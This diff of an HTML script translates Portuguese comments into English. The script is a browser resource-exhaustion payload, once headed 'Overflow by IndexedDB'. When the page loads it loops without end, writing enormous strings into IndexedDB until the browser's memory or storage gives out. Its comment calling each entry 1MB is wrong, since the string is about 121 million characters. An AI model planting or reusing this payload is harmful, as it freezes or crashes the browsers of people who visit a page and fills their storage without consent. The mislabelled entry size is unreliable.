@@ -1,8 +1,6 @@
-//Overflow by IndexedDB
-
 <script>
-// Função para consumir memória excessivamente com IndexedDB
-var request = indexedDB.open('myDatabase'); // Abre uma conexão IndexedDB
+// Function to consume excessive memory with IndexedDB
+var request = indexedDB.open('myDatabase'); // Opens an IndexedDB connection
 
 request.onupgradeneeded = function(event) {
     var db = event.target.result;
@@ -10,9 +8,9 @@ request.onupgradeneeded = function(event) {
 
     while (true) {
         try {
-            objectStore.add({ data: 'x'.repeat(11024 * 11024) }); // Adiciona uma entrada de 1MB ao IndexedDB
+            objectStore.add({ data: 'x'.repeat(11024 * 11024) }); // Adds a 1MB entry to IndexedDB
         } catch (e) {
-            console.error("Erro ao adicionar entrada no IndexedDB:", e); // Exibe qualquer erro no console
+            console.error("Error adding entry to IndexedDB:", e); // Displays any errors in the console
             break;
         }
     }
